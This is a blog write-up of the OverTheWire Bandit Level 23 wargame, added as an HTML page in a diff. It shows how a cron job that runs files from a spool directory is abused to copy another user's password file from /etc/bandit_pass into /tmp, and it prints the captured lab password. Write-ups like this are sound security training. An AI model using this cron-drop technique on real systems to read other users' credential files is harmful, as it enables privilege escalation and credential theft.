@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+
+<html lang="en">
+	<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>Bandit Level 23 Write-up</title>
+		<link rel="stylesheet" href="../../styles.css">
+		<link rel="stylesheet" href="../../../shared.css">
+	</head>
+
+	<body>
+		<div class="header">
+			<div class="profile">
+				<div class="username"><a href="../../../index.html">Lorentz0&#8209;m</a></div>
+				<div class="short-description">CTF write-ups and security related topics</div>
+			</div>
+
+			<ul>
+				<li><a href="../../../index.html">Home</a></li>
+				<li><a href="../../all_articles.html">All Posts</a></li>
+				<li><a href="../../../about.html">About</a></li>
+			</ul>
+		</div>
+
+		<div class="page-content">
+			<h1 class="title">OverTheWire Bandit Level 23 Write&#8209;up</h1>
+
+			<div class="article-info">
+				<div><img class="svg" src="../../../media/icons/calendar-days-solid.svg" alt="an icon of a calendar"> Updated: 21/05/2024</div>
+				<div>| <img class="svg" src="../../../media/icons/clock-solid.svg" alt="an icon of a clock"> 2 min read</div>
+			</div>
+
+			<hr>
+
+			<p>Let's take a look at cronjob_bandit24.sh</p>
+
+			<pre>
+				<code>
+					bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+					@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+					* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+					bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh | nl -b a
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;#!/bin/bash
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3&nbsp;&nbsp;myname=$(whoami)
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;&nbsp;cd /var/spool/$myname/foo
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6&nbsp;&nbsp;echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7&nbsp;&nbsp;for i in * .*;
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;&nbsp;do
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if [ "$i" != "." -a "$i" != ".." ];
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;then
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo "Handling $i"
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;owner="$(stat --format "%U" ./$i)"
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;13&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if [ "${owner}" = "bandit23" ]; then
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;14&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;timeout -s 9 60 ./$i
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;15&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fi
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm -f ./$i
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;17&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fi
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;18&nbsp;&nbsp;done
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19
+				</code>
+			</pre>
+
+			<div class="explanation">
+				From the code we can understand that every file under /var/spool/bandit24/foo, except from
+				the current directory <code>.</code> and the parent dir <code>..</code>, gets:
+				<ul>
+					<li>
+						Executed with a time limit of 60 seconds or 1 minute (line 14). As long as
+						the owner of the file is bandit23, (line 13) which means a script created by us.
+					</li>
+					<li>Removed forcefully afterwards with the rm command (line 16)</li>
+				</ul>
+			</div>
+
+			<p>
+				We know that the password we are looking for is stored in /etc/bandit_pass/bandit24.
+				Also any script under foo gets executed as user bandit24. Therefore, if we manage to
+				create a script that redirects the content of /etc/bandit_pass/bandit24 to another file
+				and place that script inside /var/spool/bandit24/foo, then we can extract the credentials
+				for the next level!
+			</p>
+
+			<p>
+				I will be using vim to write the code. However, you could append content to the file
+				line by line using the append >> operator (not recommended though). Make sure you add
+				execute permissions for everyone and store it under /tmp with a random name.
+			</p>
+
+			<pre>
+				<code>
+					bandit23@bandit:~$ cd /tmp/
+					bandit23@bandit:/tmp$ vim my-cool-script.sh
+					bandit23@bandit:/tmp$ cat my-cool-script.sh | nl -b a
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;#! /bin/bash
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3&nbsp;&nbsp;cat /etc/bandit_pass/bandit24 > /tmp/my-password-file.txt
+					bandit23@bandit:/tmp$ chmod o+x my-cool-script.sh
+					bandit23@bandit:/tmp$ ls -lh my-cool-script.sh
+					-rw-rw-r-x 1 bandit23 bandit23 72 &lt;Month&gt; &lt;Day&gt; &lt;time&gt; my-cool-script.sh
+				</code>
+			</pre>
+
+			<p>
+				In line 1 you can see the characterising shebang symbol (#!), which is used to indicate
+				that the content of the file is a shell script. Then we have the absolute path of the
+				language that will be used to run the script, bash in this case. In line 3 we are redirecting
+				the password we are looking for inside <code>my-password-file.txt</code> under tmp. Created
+				files already have read permissions by default in this machine, so there's no need to
+				change anything.
+			</p>
+
+			<p>
+				cronjob_bandit24.sh gets executed at the start of each minute. So it is helpful to check
+				the time with the date command, which provides date and time information, to be sure that
+				your script was executed:
+			</p>
+
+			<pre>
+				<code>
+					bandit23@bandit:/tmp$ date
+					&lt;DOW&gt; &lt;Month&gt; &lt;Day&gt; 07:43:05 PM UTC 2024
+					bandit23@bandit:/tmp$ mv my-cool-script.sh /var/spool/bandit24/foo
+					bandit23@bandit:/tmp$ date
+					&lt;DOW&gt; &lt;Month&gt; &lt;Day&gt; 07:44:04 PM UTC 2024
+					bandit23@bandit:/tmp$ ls -lh my-password-file.txt
+					-rw-rw-rw- 1 bandit23 bandit23 33 &lt;Month&gt; &lt;Day&gt; &lt;time&gt; my-password-file.txt
+					bandit23@bandit:/tmp$ cat my-password-file.txt
+					VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+				</code>
+			</pre>
+
+			<p>And that concludes the cronjob levels! Onto the next challenges!</p>
+
+			<hr>
+
+			<div class="level-links">
+				<a href="./level22.html">&lt;&#8209;Previous Level</a>
+				<a href="../../../index.html">Home&#8209;&gt;</a>
+			</div>
+		</div>
+
+		<div class="footer">
+			Copyright &#169; 2024 Lorentz0&#8209;m 
+		</div>
+	</body>
+</html>
